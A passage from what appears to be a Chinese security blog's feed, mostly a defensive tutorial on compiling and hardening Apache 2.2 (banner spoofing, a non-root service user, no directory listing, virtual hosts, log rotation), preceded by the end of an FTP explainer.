class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 相对主流的一些ftp工具&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;vsftpd proftpd filezilla ...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x03 深入理解ftp的主动与被动工作模式&lt;/p&gt;
&lt;p&gt;&lt;code&gt;命令连接&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;在客户端向ftp服务端发起连接请求时,客户端会随机选择本地的某个tcp端口与ftp服务端的21端口进行连接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;这中间会进行一系列的身份验证过程,待验证通过后,客户端与ftp服务端即会成功建立 `命令连接`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;所谓的 `命令传输连接` 也就是说,仅仅只会用这个连接来传输命令本身&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;主动模式&lt;/code&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;在 `命令连接` 建立成功后,客户端可能还需要进行一系列的数据传输动作,如,上传,下载文件...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;此时,客户端会先在本地另启一个端口监听等待连接,并利用先前与ftp客户端建立好的`命令连接`通道,告诉ftp服务端客户端所监听的端口&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;而后,ftp服务端会利用自身的20端口和刚才ftp客户端所告知的端口进行数据连接,随后就开始利用此连接来进行各类数据传输&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;注意,此时`数据连接`在建立的过程中,是ftp服务端的20端口主动连接FTP客户端的随机端口的,也就是我们所说的`主动模式`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="vsftp" scheme="https://evil-404.github.io/categories/vsftp/"/>
    
    
      <category term="vsftpd" scheme="https://evil-404.github.io/tags/vsftpd/"/>
    
  </entry>
  
  <entry>
    <title>如何将你的 apache 把控的&#39;密不透风&#39;</title>
    <link href="https://evil-404.github.io/2017-11-27-apache-sec.html"/>
    <id>https://evil-404.github.io/2017-11-27-apache-sec.html</id>
    <published>2017-11-26T20:09:17.000Z</published>
    <updated>2017-12-23T02:12:14.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 为防止配置或端口冲突,在装之前,你需要先仔细检查当前系统有没有装apache,如果有<code>先把apache服务停掉,然后卸载apache</code>,等会儿用源码重新编译安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># rpm -qa httpd</span><br><span class="line"># rpm -e --nodeps * 强制卸载apache</span><br></pre></td></tr></table></figure></p><p>演示环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CentOS6.8 x86_64    最小化,带基础库安装 eth0 : 192.168.3.45 eth1 : 192.168.4.16 eth2 : 192.168.5.16</span><br><span class="line">httpd-2.2.34.tar.gz apache官方提供的源码包</span><br></pre></td></tr></table></figure></p><p>0x02 下载apache源码包,这里暂时选择2.2.x系列的最新版,不建议再用比这个还老的版本了,漏洞比较多<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># wget http://apache.website-solution.net/httpd/httpd-2.2.34.tar.gz</span><br><span class="line"># tar xf httpd-2.2.34.tar.gz &amp;&amp; cd httpd-2.2.34</span><br></pre></td></tr></table></figure></p><p>0x03 直接到源码中去<code>改掉apache的详细版本信息</code>,跟部署nginx一样,尽可能地扰乱入侵者的判断,这里就把它模拟成IIS 7.5,实际系统应为win server 2008r2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi include/ap_release.h</span><br></pre></td></tr></table></figure></p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define AP_SERVER_BASEVENDOR &quot;IIS Software Foundation&quot;</span><br><span class="line">#define AP_SERVER_BASEPROJECT &quot;IIS HTTP Server&quot;</span><br><span class="line">#define AP_SERVER_BASEPRODUCT &quot;Microsoft-IIS/7.5&quot;</span><br><span class="line"></span><br><span class="line">#define AP_SERVER_MAJORVERSION_NUMBER 7</span><br><span class="line">#define AP_SERVER_MINORVERSION_NUMBER 5</span><br><span class="line">#define AP_SERVER_PATCHLEVEL_NUMBER   0</span><br><span class="line">#define AP_SERVER_DEVBUILD_BOOLEAN    0</span><br></pre></td></tr></table></figure><p>别忘了,把系统平台也一并改了,很显然,<code>unix平台是不可能装IIS的</code>,不然你就把自己卖了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi os/unix/os.h</span><br><span class="line">  #define PLATFORM &quot;Win32&quot;</span><br></pre></td></tr></table></figure></p><p>0x04 开始编译,安装并启动apache,此处暂时选择激活大多数模块,让apache以worker模式进行工作,默认会用prefork模式,效率不高,所以我们把它改成worker<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># yum install zlib zlib-devel gcc-c++ -y</span><br><span class="line"># ./configure --prefix=/usr/local/httpd-2.2.34 \</span><br><span class="line">--enable-deflate \</span><br><span class="line">--enable-expires \</span><br><span class="line">--enable-headers \</span><br><span class="line">--enable-modules=most \</span><br><span class="line">--enable-so \</span><br><span class="line">--with-mpm=worker \</span><br><span class="line">--enable-rewrite</span><br><span class="line"></span><br><span class="line"># make &amp;&amp; make install</span><br><span class="line"># ln -s /usr/local/httpd-2.2.34/ /usr/local/httpd</span><br></pre></td></tr></table></figure></p><p>关于 <code>apachectl 工具</code> 自身的一些选项用途<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/httpd/bin/apachectl -t   检查配置文件语法,重启服务前会用</span><br><span class="line"># /usr/local/httpd/bin/apachectl -V   查看编译参数,如果这个apache当初不是你编译的可能会用到</span><br><span class="line"># /usr/local/httpd/bin/apachectl -v   查看apache详细版本号</span><br><span class="line"># /usr/local/httpd/bin/apachectl -S   查看apache所有的虚拟主机配置</span><br><span class="line"># /usr/local/httpd/bin/apachectl -l   查看所有已编译的模块</span><br><span class="line"># /usr/local/httpd/bin/apachectl -M   查看所有已加载的模块</span><br><span class="line"># /usr/local/httpd/bin/apachectl start   启动apache</span><br><span class="line"># lsof -i :80   检查默认端口有没有起来</span><br><span class="line"># /usr/local/httpd/bin/apachectl graceful  平滑重启apache</span><br><span class="line"># /usr/local/httpd/bin/apachectl stop   关闭apache</span><br></pre></td></tr></table></figure></p><p>0x05 理解apache安装目录下各个一级目录的作用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># tree -L 1 /usr/local/httpd</span><br><span class="line">├── bin    # apache自身管理工具存放目录,如,ab,apachectl[本质还是调用httpd],httpd,apxs,htpasswd...</span><br><span class="line">├── build</span><br><span class="line">├── cgi-bin</span><br><span class="line">├── conf    # 各类配置文件存放目录,如,httpd.conf,extra [apache 的扩展配置文件存放目录]</span><br><span class="line">├── error</span><br><span class="line">├── htdocs  # 默认的站点根目录,实际部署中,一般不用</span><br><span class="line">├── icons</span><br><span class="line">├── include</span><br><span class="line">├── lib</span><br><span class="line">├── logs    # 各类日志文件存放目录,如,访问日志,错误日志</span><br><span class="line">├── man    # 自带的帮助手册</span><br><span class="line">├── manual</span><br><span class="line">└── modules # 模块存放目录</span><br></pre></td></tr></table></figure></p><p>0x06  编辑apache主配置文件<code>httpd.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /var/html/&#123;bwapp,dvws,drupal7&#125; -p   为后面配置虚拟主机先创建好网站目录</span><br><span class="line"># echo &quot;welcome to my website! by bwapp&quot; &gt; /var/html/bwapp/index.html</span><br><span class="line"># echo &quot;Hello dvws,come on&quot; &gt; /var/html/dvws/index.html</span><br><span class="line"># useradd -s /sbin/nologin -M httpd    以系统伪用户身份启动apache服务,防止入侵者利用apache提权</span><br><span class="line"># cd /usr/local/httpd/conf/ &amp;&amp; mv httpd.conf httpd.conf.bak</span><br><span class="line"># egrep -v &quot;^$|#&quot; /usr/local/httpd/conf/httpd.conf.bak &gt; httpd.conf   这里先简化下apache主配置文件,方便等会儿配置</span><br></pre></td></tr></table></figure></p><p>除了下面提到的这些配置项,其它的配置都可以不用要,如,<code>cgi,默认网站根目录</code>,因为等会儿这些全部会自定义,所以,在这里可以全部先删掉<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">ServerRoot &quot;/usr/local/httpd-2.2.34&quot; # 定义apache的安装目录</span><br><span class="line">Listen 80       # apache默认监听的web端口,没有指定ip的情况下,默认是监听在0.0.0.0</span><br><span class="line">Listen 81       # 在后面配置基于端口的虚拟主机时需要先在此定义好监听端口</span><br><span class="line">Listen 82</span><br><span class="line">&lt;IfModule !mpm_netware_module&gt;</span><br><span class="line">&lt;IfModule !mpm_winnt_module&gt;</span><br><span class="line">User httpd   # apache的服务用户,再次强调,不要傻到用root身份来运行apache服务</span><br><span class="line">Group httpd  # apache的服务用户组</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">ServerAdmin klion@sec.org    # 管理员邮箱地址</span><br><span class="line">ServerName 127.0.0.1:80     # 解决FQDN的问题</span><br><span class="line">&lt;Directory /&gt;     # 对系统根目录的权限设置</span><br><span class="line">    Options FollowSymLinks</span><br><span class="line">    AllowOverride None</span><br><span class="line">    Order deny,allow     # 禁止用户直接访问系统根目录</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">&lt;IfModule dir_module&gt;</span><br><span class="line">    DirectoryIndex index.html index.php  # 设置主页索引文件</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">&lt;FilesMatch &quot;^\.ht&quot;&gt;# 当匹配到以.ht开头的文件apache要做什么样的反应</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Deny from all</span><br><span class="line">    Satisfy All</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">ErrorLog &quot;logs/error_log&quot; # apache自身的错误日志存放位置 </span><br><span class="line">LogLevel warn# 定义apache日志的报告级别,默认是警告</span><br><span class="line">&lt;IfModule log_config_module&gt;# 定义访问日志格式</span><br><span class="line">    # 在下面combined格式日志中还要多记录一个字段`X-Forwarded-For`,用于记录客户端真实ip</span><br><span class="line">    LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot; \&quot;%&#123;X-Forwarded-For&#125;i\&quot;&quot; combined </span><br><span class="line">    LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b&quot; common</span><br><span class="line">    &lt;IfModule logio_module&gt;</span><br><span class="line">      LogFormat &quot;%h %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot; %I %O&quot; combinedio</span><br><span class="line">    &lt;/IfModule&gt;</span><br><span class="line">    CustomLog &quot;logs/access_log&quot; common</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">DefaultType text/plain</span><br><span class="line">&lt;IfModule headers_module&gt;</span><br><span class="line">    RequestHeader unset Proxy early</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">&lt;IfModule mime_module&gt;# mime类型设定,也就是说,遇到什么类型的文件就做什么样的操作</span><br><span class="line">    TypesConfig conf/mime.types</span><br><span class="line">    AddType application/x-compress .Z</span><br><span class="line">    AddType application/x-gzip .gz .tgz</span><br><span class="line">    # 意思就是说,当apache遇到.php这样的后缀就丢给libphp5模块去处理,也就是说,如果这里是.jpg,它依然会被当做php去解析,如,图片马...</span><br><span class="line">    AddType application/x-httpd-php .php </span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">&lt;IfModule ssl_module&gt;</span><br><span class="line">SSLRandomSeed startup builtin</span><br><span class="line">SSLRandomSeed connect builtin</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line">Include conf/extra/httpd-mpm.conf  # 包含apache扩展配置文件</span><br><span class="line">Include conf/extra/httpd-vhosts.conf  </span><br><span class="line">Include conf/extra/httpd-default.conf</span><br><span class="line">&lt;Directory &quot;/var/html/bwapp&quot;&gt;</span><br><span class="line">    # 我们在Indexes前面加上了&apos;-&apos;,意思就是禁止目录遍历,防止敏感文件泄露,此项非常重要,另外,关闭CGI,SSI,以及Follow Symbolic Links</span><br><span class="line">    Options -Indexes -Includes -ExecCGI –FollowSymLinks </span><br><span class="line">    AllowOverride None</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">&lt;Directory &quot;/var/html/dvws&quot;&gt;</span><br><span class="line">    Options -Indexes FollowSymLinks</span><br><span class="line">    AllowOverride None</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">&lt;Directory &quot;/var/html/drupal7&quot;&gt;</span><br><span class="line">    Options -Indexes FollowSymLinks</span><br><span class="line">    AllowOverride None</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">#LoadModule php5_module  /usr/local/httpd-2.2.34/modules/libphp5.so</span><br><span class="line">LoadModule php5_module   modules/libphp5.so# 该模块在你编译安装完php以后会自动生成并自动加入该配置文件</span><br><span class="line">#LoadModule rewrite_module modules/mod_rewrite.so</span><br><span class="line">TraceEnable off # 禁用trace方法,防止xss</span><br></pre></td></tr></table></figure></p><p><code>让apache支持mod_rewrite模块</code>,因为经常要用到该模块,添加重写功能以后只需要在对应的虚拟主机中添加<code>AllowOverride All</code>项,即可读取<code>.htaccess</code>中的正则,此项为<code>Nnoe</code>时则表示不读取,除此之外,对于模块,用什么就加什么即可,因为有些漏洞只发生在特定的模块上,所以为了防止别人利用,不用的就不要加了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># cd httpd-2.2.34/modules/mappers/</span><br><span class="line"># /usr/local/httpd/bin/apxs -c mod_rewrite.c</span><br><span class="line"># /usr/local/httpd/bin/apxs -i -a -n mod_rewrite mod_rewrite.la</span><br><span class="line">  #LoadModule mod_rewrite_module modules/mod_rewrite.so # 中间可能会报两个错,改名,注释掉即可</span><br><span class="line"># /usr/local/httpd/bin/apachectl configtest</span><br><span class="line"># /usr/local/httpd/bin/apachectl -t</span><br><span class="line"># /usr/local/httpd/bin/apachectl graceful</span><br></pre></td></tr></table></figure></p><p>0x07 编辑扩展配置文件,存在<code>/usr/local/httpd/conf/extra/</code>目录下</p><p>配置<code>基于域名的虚拟主机</code> <code>httpd-vhosts.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/extra/httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line">NameVirtualHost *:80</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerAdmin bwapp@sec.org# 网站管理员邮箱</span><br><span class="line">    DocumentRoot &quot;/var/html/bwapp&quot;# 站点根目录</span><br><span class="line">    ServerName bwapp.cc # 主域名</span><br><span class="line">    ServerAlias www.bwapp.cc # 别名,不用可以删掉</span><br><span class="line">    ErrorLog &quot;logs/bwapp-error_log&quot;# 错误日志</span><br><span class="line">    CustomLog &quot;logs/bwapp-access_log&quot; combined # 选择日志格式,combined会记录的更详细,方便日后审查</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></p><p>配置<code>基于端口的虚拟主机</code>,需要先在<code>httpd.conf</code>中定义好要监听的端口,然后再在<code>httpd-vhosts.conf</code>中定义即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/httpd.conf</span><br><span class="line">  Listen 81</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/extra/httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line">NameVirtualHost *:81</span><br><span class="line">&lt;VirtualHost *:81&gt;</span><br><span class="line">    ServerAdmin dvws@sec.org</span><br><span class="line">    DocumentRoot &quot;/var/html/dvws&quot;</span><br><span class="line">    ServerName dvws.cc</span><br><span class="line">    ServerAlias www.dvws.cc</span><br><span class="line">    ErrorLog &quot;logs/dvws-error_log&quot;</span><br><span class="line">    CustomLog &quot;logs/dvws-access_log&quot; combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p><code>基于ip的虚拟主机</code>,需要当前机器有多个可用ip地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/httpd.conf</span><br><span class="line">  Listen 82</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/extra/httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line">NameVirtualHost 192.168.5.16:82</span><br><span class="line">&lt;VirtualHost 192.168.5.16:82&gt;</span><br><span class="line">    ServerAdmin drupal7@sec.org</span><br><span class="line">    DocumentRoot &quot;/var/html/drupal7&quot;</span><br><span class="line">    ServerName 192.168.5.16</span><br><span class="line">    ErrorLog &quot;logs/drupal7-error_log&quot;</span><br><span class="line">    CustomLog &quot;logs/drupal7-access_log&quot; combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># egrep -v &quot;#|^$&quot; httpd-vhosts.conf &gt; httpd-vhosts.conf.bak备份所有虚拟主机配置</span><br></pre></td></tr></table></figure><p>在 <code>httpd-mpm.conf</code>文件中可以调节worker,prefork模式下的详细参数,如,并发之类…因为之前在编译时已经指定使用worker模式,所以这里你只需配置worker里面的参数即可,并非此处重点就不细说了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/extra/httpd-mpm.conf</span><br></pre></td></tr></table></figure></p><p><code>httpd-default.conf</code> 文件主要用来设置一些和http响应头有关的内容,如,.htaccess文件,隐藏apache版本什么的,因为之前在源码中已经彻底修改过apache默认版本信息,所以这里就不用再改了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/extra/httpd-default.conf</span><br><span class="line">  ServerTokens Prod</span><br><span class="line">  ServerSignature Off</span><br></pre></td></tr></table></figure></p><p>0x08 解决FQDN<code>完整域名</code>的问题,不然每次重启都要等半天,添加如下内容即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/httpd.conf</span><br><span class="line">  ServerName 127.0.0.1:80</span><br></pre></td></tr></table></figure></p><p>0x09 利用<code>cronlog工具</code>来帮我们实现自动轮询apache访问日志,也可用apache自带的rotatelogs工具配合系统定时任务实现,根据个人喜好而定</p><p>编译安装cronlog<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># tar xf cronolog-1.6.2.tar.gz</span><br><span class="line"># cd cronolog-1.6.2</span><br><span class="line"># ./configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>接下来只需要到指定的虚拟主机中修改日志格式即可,之后重启apache即可生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/extra/httpd-vhosts.conf</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerAdmin bwapp@sec.org</span><br><span class="line">    DocumentRoot &quot;/var/html/bwapp&quot;</span><br><span class="line">    ServerName bwapp.cc</span><br><span class="line">    ServerAlias www.bwapp.cc</span><br><span class="line">    ErrorLog &quot;logs/bwapp-error_log&quot;</span><br><span class="line">    CustomLog &quot;|/usr/local/sbin/cronolog /usr/local/httpd/logs/bwapp-access_%Y%m%d.log&quot; combined</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># /usr/local/httpd/bin/apachectl -t</span><br><span class="line"># /usr/local/httpd/bin/apachectl graceful</span><br></pre></td></tr></table></figure></p><p>0x10 有时我们需要除一些无用的日志信息,便于我们后续能尽快从日志中分析各种攻击行为,如,一些静态数据,css,js,各类图片文件,你就可以用下面的方式,让apache不要记录这类数据的访问日志</p><p>先到<code>httpd.conf</code>中去定义好 <code>img</code> 变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">&lt;Directory &quot;/var/html/bwapp&quot;&gt;</span><br><span class="line">    SetEnvIf Request_URI &quot;.*\.gif$&quot; img</span><br><span class="line">    SetEnvIf Request_URI &quot;.*\.jpg$&quot; img</span><br><span class="line">    SetEnvIf Request_URI &quot;.*\.png$&quot; img</span><br><span class="line">    SetEnvIf Request_URI &quot;.*\.bmp$&quot; img</span><br><span class="line">    SetEnvIf Request_URI &quot;.*\.swf$&quot; img</span><br><span class="line">    SetEnvIf Request_URI &quot;.*\.js$&quot; img</span><br><span class="line">    SetEnvIf Request_URI &quot;.*\.css$&quot; img</span><br><span class="line">    Options -Indexes FollowSymLinks</span><br><span class="line">    AllowOverride None</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from all</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure></p><p>然后再到<code>httpd-vhosts.conf</code>文件中,去找到你想引用到的虚拟主机上去引用即可,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/httpd/conf/extra/httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerAdmin bwapp@sec.org</span><br><span class="line">    DocumentRoot &quot;/var/html/bwapp/bWAPP/&quot;</span><br><span class="line">    ServerName bwapp.cc</span><br><span class="line">    ServerAlias www.bwapp.cc</span><br><span class="line">    ErrorLog &quot;logs/bwapp-error_log&quot;</span><br><span class="line">    CustomLog &quot;|/usr/local/sbin/cronolog 